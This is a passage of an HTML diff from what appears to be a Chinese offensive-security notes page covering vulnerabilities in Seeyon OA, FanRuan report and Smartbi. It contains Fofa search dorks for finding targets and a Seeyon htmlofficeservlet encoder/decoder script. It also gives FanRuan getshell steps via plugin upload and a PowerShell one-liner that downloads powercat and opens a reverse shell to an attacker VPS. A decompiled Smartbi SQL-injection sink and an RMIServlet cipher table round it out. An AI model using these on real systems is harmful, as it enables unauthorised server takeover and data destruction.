+                equal_num += <span class="hljs-number">1</span>
+                temp_list += [<span class="hljs-string">'0'</span> * <span class="hljs-number">8</span>]
+        temp_str = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(temp_list)
+        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">6</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">18</span>]]
+        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list]
+        <span class="hljs-keyword">if</span> equal_num:
+            temp_str_list = temp_str_list[<span class="hljs-number">0</span>:<span class="hljs-number">4</span> - equal_num]
+        output_str += <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([letters[<span class="hljs-keyword">x</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])
+        str_ascii_list = str_ascii_list[<span class="hljs-number">3</span>:]
+    output_str = output_str + <span class="hljs-string">'='</span> * equal_num
+    <span class="hljs-keyword">return</span> output_str
+
+
+def base64_decode(input_str):
+    str_ascii_list = [<span class="hljs-string">'{:0&gt;6}'</span>.format(str(bin(letters.<span class="hljs-built_in">index</span>(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>))
+                      <span class="hljs-keyword">for</span> i in input_str <span class="hljs-keyword">if</span> i != <span class="hljs-string">'='</span>]
+    output_str = <span class="hljs-string">''</span>
+    equal_num = input_str.<span class="hljs-built_in">count</span>(<span class="hljs-string">'='</span>)
+    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>
+        temp_list = str_ascii_list[:<span class="hljs-number">4</span>]
+        temp_str = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(temp_list)
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_str) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:
+            temp_str = temp_str[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span> * equal_num * <span class="hljs-number">2</span>]
+        temp_str_list = [temp_str[<span class="hljs-keyword">x</span>:<span class="hljs-keyword">x</span> + <span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in [<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]]
+        temp_str_list = [<span class="hljs-keyword">int</span>(<span class="hljs-keyword">x</span>, <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span>]
+        output_str += <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([chr(<span class="hljs-keyword">x</span>) <span class="hljs-keyword">for</span> <span class="hljs-keyword">x</span> in temp_str_list])
+        str_ascii_list = str_ascii_list[<span class="hljs-number">4</span>:]
+    <span class="hljs-keyword">return</span> output_str
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">2</span>:
+        <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>]))
+    elif <span class="hljs-built_in">len</span>(<span class="hljs-built_in">argv</span>) == <span class="hljs-number">3</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">'-d'</span>:
+            <span class="hljs-keyword">print</span>(base64_decode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">print</span>(base64_encode(<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>]))
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Seeyon OA /seeyon/htmlofficeservlet param encode/decode"</span>)
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">"Usage:"</span>)
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s encoded_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])t
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s -d encoded_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])
+        <span class="hljs-keyword">print</span>(<span class="hljs-string">"python %s -e raw_str"</span> % <span class="hljs-built_in">argv</span>[<span class="hljs-number">0</span>])</code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
@@ -435,10 +664,11 @@
 <p><strong>2. 影响组件</strong></p>
 <p>帆软报表 seeyonreport</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892</span><br><span class="line">seeyonreport</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>seeyoon.com<span class="hljs-regexp">/seeyonreport/</span>ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=<span class="hljs-number">1560911828892</span>
+seeyonreport</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="用友-致远OA"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"用友-致远OA"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog<br><a href="http://foreversong.cn/archives/1378" target="_blank" rel="noopener">http://foreversong.cn/archives/1378</a></p>
@@ -457,7 +687,7 @@
 <p>复制LocaleFinder.class到<br><code>\com.fr.plugin.external-1.3.4.zip\fr-plugin-external-1.3.4\fr-plugin-external-1.3.4.jar\com\fr\plugin\external\locale\</code></p>
 <p>进入到插件管理界面, 上传符合规范的jar包插件即可<br>没生效就访问一下 <code>https://xxxx/seeyonreport/ReportServer?op=im</code></p>
 <p>一般后台都是win, 可以直接使用powershell进行反弹shell</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c vps_ip -p 6666 -e cmd</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs reasonml">powershell <span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>;powercat -c vps_ip -p <span class="hljs-number">6666</span> -e cmd</code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
@@ -466,31 +696,162 @@
 <p>Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户.</p>
 <p><strong>2. 影响组件</strong><br>Smartbi</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SmartBi</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">SmartBi</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Smartbi"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Smartbi"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）<br><a href="https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ</a></p>
 <p>漏洞文件<br><code>vision/userListManager.jsp</code></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">function doDel(){</span><br><span class="line">   var ids = [];</span><br><span class="line">   // 全选</span><br><span class="line">   if($("#checkAll").checked){</span><br><span class="line">      if(curRows){</span><br><span class="line">         curRows.forEach(function(val, index){</span><br><span class="line">            ids.push(val.id);</span><br><span class="line">         });</span><br><span class="line">      }</span><br><span class="line">   }else{</span><br><span class="line">      if(curRows){</span><br><span class="line">         $("[name='checkTr']").each(function(){</span><br><span class="line">            if(this.checked){</span><br><span class="line">               ids.push(this.id);</span><br><span class="line">            }</span><br><span class="line">         });</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">   if(ids &amp;&amp; ids.length &gt; 0){</span><br><span class="line">      if(!canOpt()){</span><br><span class="line">         alert("&lt;%=StringUtil.getLanguageValue("Youdonothavepermissiontodoso")%&gt;");</span><br><span class="line">         return;</span><br><span class="line">      }</span><br><span class="line">      var msg = "&lt;%=StringUtil.getLanguageValue("Suredelete?")%&gt;";</span><br><span class="line">      var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;</span><br><span class="line">      alert(msg, "&lt;%=StringUtil.getLanguageValue("Removetips")%&gt;", flags, function(ret) {</span><br><span class="line">         if (ret == modalWindow.ID_YES) {</span><br><span class="line">            var ret = jsloader.resolve("freequery.common.util").remoteInvokeEx2("BIConfigService", "delUsers", [ids]);</span><br><span class="line">            if(ret &amp;&amp; ret.result == 1){</span><br><span class="line">               alert("&lt;%=StringUtil.getLanguageValue("Deletedsuccessfully")%&gt;");</span><br><span class="line">               refresh();</span><br><span class="line">            }</span><br><span class="line">         }</span><br><span class="line">      }, this);</span><br><span class="line">   }else{</span><br><span class="line">      alert("&lt;%=StringUtil.getLanguageValue("Noselectedobjectyouwanttodelete")%&gt;");</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line">smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class</span><br><span class="line">public int delUsers(List&lt;String&gt; ids) {</span><br><span class="line">    boolean succ = true;</span><br><span class="line">    String idStr = "";</span><br><span class="line">    if (ids != null &amp;&amp; ids.size() &gt; 0) {</span><br><span class="line">        for(int i = 0; i &lt; ids.size(); ++i) {</span><br><span class="line">            if (i == 0) {</span><br><span class="line">                idStr = "('" + (String)ids.get(i) + "'";</span><br><span class="line">            } else {</span><br><span class="line">                idStr = idStr + ", " + "'" + (String)ids.get(i) + "'";</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        idStr = idStr + ")";</span><br><span class="line">        Connection conn = null;</span><br><span class="line">        PreparedStatement prep = null;</span><br><span class="line">        Object rs = null;</span><br><span class="line"></span><br><span class="line">        try {</span><br><span class="line">            conn = DbUtil.getRepoConnection();</span><br><span class="line">            conn.setAutoCommit(false);</span><br><span class="line">            String sqlUser = "delete from t_user where c_userid in " + idStr;</span><br><span class="line">            String sqlUserAttr = "delete from t_userattr where c_userid in " + idStr;</span><br><span class="line">            String sqlUserconfig = "delete from t_userconfig where c_userid in " + idStr;</span><br><span class="line">            String sqlUserRole = "delete from t_user_role where c_userid in " + idStr;</span><br><span class="line">            String sqlUserGroup = "delete from t_group_user where c_userid in " + idStr;</span><br><span class="line">            prep = conn.prepareStatement(sqlUser);</span><br><span class="line">            prep.execute();</span><br><span class="line">            prep = conn.prepareStatement(sqlUserAttr);</span><br><span class="line">            prep.execute();</span><br><span class="line">            prep = conn.prepareStatement(sqlUserconfig);</span><br><span class="line">            prep.execute();</span><br><span class="line">            prep = conn.prepareStatement(sqlUserRole);</span><br><span class="line">            prep.execute();</span><br><span class="line">            prep = conn.prepareStatement(sqlUserGroup);</span><br><span class="line">            prep.execute();</span><br><span class="line">            conn.commit();</span><br><span class="line">        } catch (Exception var17) {</span><br><span class="line">            try {</span><br><span class="line">                succ = false;</span><br><span class="line">                conn.rollback();</span><br><span class="line">            } catch (SQLException var16) {</span><br><span class="line">                throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);</span><br><span class="line">        } finally {</span><br><span class="line">            DbUtil.closeDBObject((ResultSet)rs, prep, conn);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        return succ ? 1 : 0;</span><br><span class="line">    } else {</span><br><span class="line">        return 1;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doDel</span>(<span class="hljs-params"></span>)</span>{
+   <span class="hljs-keyword">var</span> ids = [];
+   <span class="hljs-comment">// 全选</span>
+   <span class="hljs-keyword">if</span>($(<span class="hljs-string">"#checkAll"</span>).checked){
+      <span class="hljs-keyword">if</span>(curRows){
+         curRows.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">val, index</span>)</span>{
+            ids.push(val.id);
+         });
+      }
+   }<span class="hljs-keyword">else</span>{
+      <span class="hljs-keyword">if</span>(curRows){
+         $(<span class="hljs-string">"[name='checkTr']"</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.checked){
+               ids.push(<span class="hljs-keyword">this</span>.id);
+            }
+         });
+      }
+   }
+   <span class="hljs-keyword">if</span>(ids &amp;&amp; ids.length &gt; <span class="hljs-number">0</span>){
+      <span class="hljs-keyword">if</span>(!canOpt()){
+         alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Youdonothavepermissiontodoso<span class="hljs-string">")%&gt;"</span>);
+         <span class="hljs-keyword">return</span>;
+      }
+      <span class="hljs-keyword">var</span> msg = <span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Suredelete?<span class="hljs-string">")%&gt;"</span>;
+      <span class="hljs-keyword">var</span> flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION;
+      alert(msg, <span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Removetips<span class="hljs-string">")%&gt;"</span>, flags, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">ret</span>) </span>{
+         <span class="hljs-keyword">if</span> (ret == modalWindow.ID_YES) {
+            <span class="hljs-keyword">var</span> ret = jsloader.resolve(<span class="hljs-string">"freequery.common.util"</span>).remoteInvokeEx2(<span class="hljs-string">"BIConfigService"</span>, <span class="hljs-string">"delUsers"</span>, [ids]);
+            <span class="hljs-keyword">if</span>(ret &amp;&amp; ret.result == <span class="hljs-number">1</span>){
+               alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Deletedsuccessfully<span class="hljs-string">")%&gt;"</span>);
+               refresh();
+            }
+         }
+      }, <span class="hljs-keyword">this</span>);
+   }<span class="hljs-keyword">else</span>{
+      alert(<span class="hljs-string">"&lt;%=StringUtil.getLanguageValue("</span>Noselectedobjectyouwanttodelete<span class="hljs-string">")%&gt;"</span>);
+   }
+}
+smartbi/WEB-INF/lib/smartbi-BIConfig.jar!<span class="hljs-regexp">/smartbi/</span>config/BIConfigService.class
+public int delUsers(List&lt;<span class="hljs-built_in">String</span>&gt; ids) {
+    boolean succ = <span class="hljs-literal">true</span>;
+    <span class="hljs-built_in">String</span> idStr = <span class="hljs-string">""</span>;
+    <span class="hljs-keyword">if</span> (ids != <span class="hljs-literal">null</span> &amp;&amp; ids.size() &gt; <span class="hljs-number">0</span>) {
+        <span class="hljs-keyword">for</span>(int i = <span class="hljs-number">0</span>; i &lt; ids.size(); ++i) {
+            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) {
+                idStr = <span class="hljs-string">"('"</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">"'"</span>;
+            } <span class="hljs-keyword">else</span> {
+                idStr = idStr + <span class="hljs-string">", "</span> + <span class="hljs-string">"'"</span> + (<span class="hljs-built_in">String</span>)ids.get(i) + <span class="hljs-string">"'"</span>;
+            }
+        }
+
+        idStr = idStr + <span class="hljs-string">")"</span>;
+        Connection conn = <span class="hljs-literal">null</span>;
+        PreparedStatement prep = <span class="hljs-literal">null</span>;
+        <span class="hljs-built_in">Object</span> rs = <span class="hljs-literal">null</span>;
+
+        <span class="hljs-keyword">try</span> {
+            conn = DbUtil.getRepoConnection();
+            conn.setAutoCommit(<span class="hljs-literal">false</span>);
+            <span class="hljs-built_in">String</span> sqlUser = <span class="hljs-string">"delete from t_user where c_userid in "</span> + idStr;
+            <span class="hljs-built_in">String</span> sqlUserAttr = <span class="hljs-string">"delete from t_userattr where c_userid in "</span> + idStr;
+            <span class="hljs-built_in">String</span> sqlUserconfig = <span class="hljs-string">"delete from t_userconfig where c_userid in "</span> + idStr;
+            <span class="hljs-built_in">String</span> sqlUserRole = <span class="hljs-string">"delete from t_user_role where c_userid in "</span> + idStr;
+            <span class="hljs-built_in">String</span> sqlUserGroup = <span class="hljs-string">"delete from t_group_user where c_userid in "</span> + idStr;
+            prep = conn.prepareStatement(sqlUser);
+            prep.execute();
+            prep = conn.prepareStatement(sqlUserAttr);
+            prep.execute();
+            prep = conn.prepareStatement(sqlUserconfig);
+            prep.execute();
+            prep = conn.prepareStatement(sqlUserRole);
+            prep.execute();
+            prep = conn.prepareStatement(sqlUserGroup);
+            prep.execute();
+            conn.commit();
+        } <span class="hljs-keyword">catch</span> (Exception var17) {
+            <span class="hljs-keyword">try</span> {
+                succ = <span class="hljs-literal">false</span>;
+                conn.rollback();
+            } <span class="hljs-keyword">catch</span> (SQLException var16) {
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
+            }
+
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SmartbiException(ConfigErrorCode.DELETE_FAILED, var17);
+        } <span class="hljs-keyword">finally</span> {
+            DbUtil.closeDBObject((ResultSet)rs, prep, conn);
+        }
+
+        <span class="hljs-keyword">return</span> succ ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+}</code></pre>
 
 <p><strong>6. 漏洞利用</strong></p>
 <p>这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了</p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.RMIServlet加解密代码</p>
 <p>虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ENCODING_SCHEDULE = {</span><br><span class="line">    "0": "7", "1": "1", "2": "u", "3": "N", "4": "K", "5": "J", "6": "M", "7": "9", "8": "'", "9": "m", "!": "P", </span><br><span class="line">    "%": "/", "'": "n", "(": "A", ")": "E", "*": "s", "+": "+", "-": "f", ".": "q", "A": "O", "B": "V", "C": "t", </span><br><span class="line">    "D": "T", "E": "a", "F": "x", "G": "H", "H": "r", "I": "c", "J": "v", "K": "l", "L": "8", "M": "F", "N": "3", </span><br><span class="line">    "O": "o", "P": "L", "Q": "Y", "R": "j", "S": "W", "T": "*", "U": "z", "V": "Z", "W": "!", "X": "B", "Y": ")", </span><br><span class="line">    "Z": "U", "a": "(", "b": "~", "c": "i", "d": "h", "e": "p", "f": "_", "g": "-", "h": "I", "i": "R", "j": ".", </span><br><span class="line">    "k": "G", "l": "S", "m": "d", "n": "6", "o": "w", "p": "5", "q": "0", "r": "4", "s": "D", "t": "k", "u": "Q", </span><br><span class="line">    "v": "g", "w": "b", "x": "C", "y": "2", "z": "X", "~": "e", "_": "y", </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">DECODING_SCHEDULE = {</span><br><span class="line">    "7": "0", "1": "1", "u": "2", "N": "3", "K": "4", "J": "5", "M": "6", "9": "7", "'": "8", "m": "9", "P": "!", </span><br><span class="line">    "/": "%", "n": "'", "A": "(", "E": ")", "s": "*", "+": "+", "f": "-", "q": ".", "O": "A", "V": "B", "t": "C", </span><br><span class="line">    "T": "D", "a": "E", "x": "F", "H": "G", "r": "H", "c": "I", "v": "J", "l": "K", "8": "L", "F": "M", "3": "N", </span><br><span class="line">    "o": "O", "L": "P", "Y": "Q", "j": "R", "W": "S", "*": "T", "z": "U", "Z": "V", "!": "W", "B": "X", ")": "Y", </span><br><span class="line">    "U": "Z", "(": "a", "~": "b", "i": "c", "h": "d", "p": "e", "_": "f", "-": "g", "I": "h", "R": "i", ".": "j", </span><br><span class="line">    "G": "k", "S": "l", "d": "m", "6": "n", "w": "o", "5": "p", "0": "q", "4": "r", "D": "s", "k": "t", "Q": "u", </span><br><span class="line">    "g": "v", "b": "w", "C": "x", "2": "y", "X": "z", "e": "~", "y": "_", </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">#此函数可以用来加密明文也可以解密服务器返回的密文</span><br><span class="line">def encode(code):</span><br><span class="line">    out = ""</span><br><span class="line">    for item in code:</span><br><span class="line">        out = out + ENCODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def decode(code):</span><br><span class="line">    out = ""</span><br><span class="line">    for item in code:</span><br><span class="line">        out = out + DECODING_SCHEDULE.get(item, item)</span><br><span class="line">    return out</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs cs">ENCODING_SCHEDULE = {
+    <span class="hljs-string">"0"</span>: <span class="hljs-string">"7"</span>, <span class="hljs-string">"1"</span>: <span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>: <span class="hljs-string">"u"</span>, <span class="hljs-string">"3"</span>: <span class="hljs-string">"N"</span>, <span class="hljs-string">"4"</span>: <span class="hljs-string">"K"</span>, <span class="hljs-string">"5"</span>: <span class="hljs-string">"J"</span>, <span class="hljs-string">"6"</span>: <span class="hljs-string">"M"</span>, <span class="hljs-string">"7"</span>: <span class="hljs-string">"9"</span>, <span class="hljs-string">"8"</span>: <span class="hljs-string">"'"</span>, <span class="hljs-string">"9"</span>: <span class="hljs-string">"m"</span>, <span class="hljs-string">"!"</span>: <span class="hljs-string">"P"</span>, 
+    <span class="hljs-string">"%"</span>: <span class="hljs-string">"/"</span>, <span class="hljs-string">"'"</span>: <span class="hljs-string">"n"</span>, <span class="hljs-string">"("</span>: <span class="hljs-string">"A"</span>, <span class="hljs-string">")"</span>: <span class="hljs-string">"E"</span>, <span class="hljs-string">"*"</span>: <span class="hljs-string">"s"</span>, <span class="hljs-string">"+"</span>: <span class="hljs-string">"+"</span>, <span class="hljs-string">"-"</span>: <span class="hljs-string">"f"</span>, <span class="hljs-string">"."</span>: <span class="hljs-string">"q"</span>, <span class="hljs-string">"A"</span>: <span class="hljs-string">"O"</span>, <span class="hljs-string">"B"</span>: <span class="hljs-string">"V"</span>, <span class="hljs-string">"C"</span>: <span class="hljs-string">"t"</span>, 
+    <span class="hljs-string">"D"</span>: <span class="hljs-string">"T"</span>, <span class="hljs-string">"E"</span>: <span class="hljs-string">"a"</span>, <span class="hljs-string">"F"</span>: <span class="hljs-string">"x"</span>, <span class="hljs-string">"G"</span>: <span class="hljs-string">"H"</span>, <span class="hljs-string">"H"</span>: <span class="hljs-string">"r"</span>, <span class="hljs-string">"I"</span>: <span class="hljs-string">"c"</span>, <span class="hljs-string">"J"</span>: <span class="hljs-string">"v"</span>, <span class="hljs-string">"K"</span>: <span class="hljs-string">"l"</span>, <span class="hljs-string">"L"</span>: <span class="hljs-string">"8"</span>, <span class="hljs-string">"M"</span>: <span class="hljs-string">"F"</span>, <span class="hljs-string">"N"</span>: <span class="hljs-string">"3"</span>, 
+    <span class="hljs-string">"O"</span>: <span class="hljs-string">"o"</span>, <span class="hljs-string">"P"</span>: <span class="hljs-string">"L"</span>, <span class="hljs-string">"Q"</span>: <span class="hljs-string">"Y"</span>, <span class="hljs-string">"R"</span>: <span class="hljs-string">"j"</span>, <span class="hljs-string">"S"</span>: <span class="hljs-string">"W"</span>, <span class="hljs-string">"T"</span>: <span class="hljs-string">"*"</span>, <span class="hljs-string">"U"</span>: <span class="hljs-string">"z"</span>, <span class="hljs-string">"V"</span>: <span class="hljs-string">"Z"</span>, <span class="hljs-string">"W"</span>: <span class="hljs-string">"!"</span>, <span class="hljs-string">"X"</span>: <span class="hljs-string">"B"</span>, <span class="hljs-string">"Y"</span>: <span class="hljs-string">")"</span>, 
+    <span class="hljs-string">"Z"</span>: <span class="hljs-string">"U"</span>, <span class="hljs-string">"a"</span>: <span class="hljs-string">"("</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"~"</span>, <span class="hljs-string">"c"</span>: <span class="hljs-string">"i"</span>, <span class="hljs-string">"d"</span>: <span class="hljs-string">"h"</span>, <span class="hljs-string">"e"</span>: <span class="hljs-string">"p"</span>, <span class="hljs-string">"f"</span>: <span class="hljs-string">"_"</span>, <span class="hljs-string">"g"</span>: <span class="hljs-string">"-"</span>, <span class="hljs-string">"h"</span>: <span class="hljs-string">"I"</span>, <span class="hljs-string">"i"</span>: <span class="hljs-string">"R"</span>, <span class="hljs-string">"j"</span>: <span class="hljs-string">"."</span>, 
+    <span class="hljs-string">"k"</span>: <span class="hljs-string">"G"</span>, <span class="hljs-string">"l"</span>: <span class="hljs-string">"S"</span>, <span class="hljs-string">"m"</span>: <span class="hljs-string">"d"</span>, <span class="hljs-string">"n"</span>: <span class="hljs-string">"6"</span>, <span class="hljs-string">"o"</span>: <span class="hljs-string">"w"</span>, <span class="hljs-string">"p"</span>: <span class="hljs-string">"5"</span>, <span class="hljs-string">"q"</span>: <span class="hljs-string">"0"</span>, <span class="hljs-string">"r"</span>: <span class="hljs-string">"4"</span>, <span class="hljs-string">"s"</span>: <span class="hljs-string">"D"</span>, <span class="hljs-string">"t"</span>: <span class="hljs-string">"k"</span>, <span class="hljs-string">"u"</span>: <span class="hljs-string">"Q"</span>, 
